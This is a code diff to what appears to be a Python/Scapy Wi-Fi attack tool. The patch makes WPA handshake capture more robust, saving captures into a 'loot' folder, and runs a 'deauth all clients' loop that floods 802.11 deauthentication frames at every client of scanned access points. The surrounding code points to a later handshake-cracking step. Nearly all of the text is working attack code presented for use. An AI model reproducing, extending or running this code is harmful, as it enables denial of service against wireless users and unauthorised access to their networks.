@@ -8,6 +8,9 @@ from threading import Thread
 from random import choice, randint
 from http.server import BaseHTTPRequestHandler, SimpleHTTPRequestHandler, HTTPServer
 
+if not os.path.isdir("loot"):
+    print("📁 Missing loot folder. Creating it now.")
+    os.makedirs("loot", exist_ok=True)
 
 def require_root():
     if os.geteuid() != 0:
@@ -85,16 +88,23 @@ def scan_clients():
         print("✅ Scan stopped.")
 
 def capture_handshake(iface, bssid):
-    os.makedirs("loot", exist_ok=True)
     path = f"loot/handshake_{bssid.replace(':','')}.pcap"
     print(f"📡 Capturing handshake to {bssid}, saving to {path}")
-    def eapol(pkt): return pkt.haslayer(EAPOL) and pkt.addr2 == bssid
-    pkts = sniff(iface=iface, lfilter=eapol, timeout=60)
-    if pkts:
-        wrpcap(path, pkts)
-        print(f"✅ Saved handshake to {path}")
-    else:
-        print("⚠️ No handshake captured.")
+
+    def eapol(pkt):
+        return pkt.haslayer(EAPOL) and (
+            pkt.addr1 == bssid or pkt.addr2 == bssid or pkt.addr3 == bssid
+        )
+
+    try:
+        pkts = sniff(iface=iface, lfilter=eapol, timeout=10)
+        if pkts:
+            wrpcap(path, pkts)
+            print(f"✅ Saved handshake to {path}")
+        else:
+            print(f"⚠ No handshake captured for {bssid}")
+    except Exception as e:
+        print(f"❌ Error sniffing for {bssid}: {e}")
 
 def deauth_attack():
     iface = input(" Monitor mode interface: ").strip()
@@ -118,12 +128,19 @@ def deauth_all():
     count = int(input(" Number of packets per client (default 100): ") or 100)
     delay = float(input(" Delay between packets (default 0.05): ") or 0.05)
     print("💥 Deauthing all clients and sniffing handshakes...\n")
+
     for bssid, data in scan_results.items():
-        Thread(target=capture_handshake, args=(iface, bssid), daemon=True).start()
+        # 🔐 Sequential handshake capture to avoid socket overload
+        print(f"📡 Sniffing handshake for {bssid} ({seen_aps.get(bssid, 'Unknown')})...")
+        capture_handshake(iface, bssid)
+
         for client in data["clients"]:
-            frame = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
-            sendp(frame, iface=iface, count=count, inter=delay, verbose=0)
-            print(f"🚀 Deauthed {client} from {data['ssid']}")
+            try:
+                frame = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
+                sendp(frame, iface=iface, count=count, inter=delay, verbose=0)
+                print(f"🚀 Deauthed {client} from {seen_aps.get(bssid, 'Unknown')}")
+            except OSError as e:
+                print(f"❌ Error sending deauth to {client}: {e}")
 
 def crack_handshakes():
     print(" Crack Captured Handshakes")
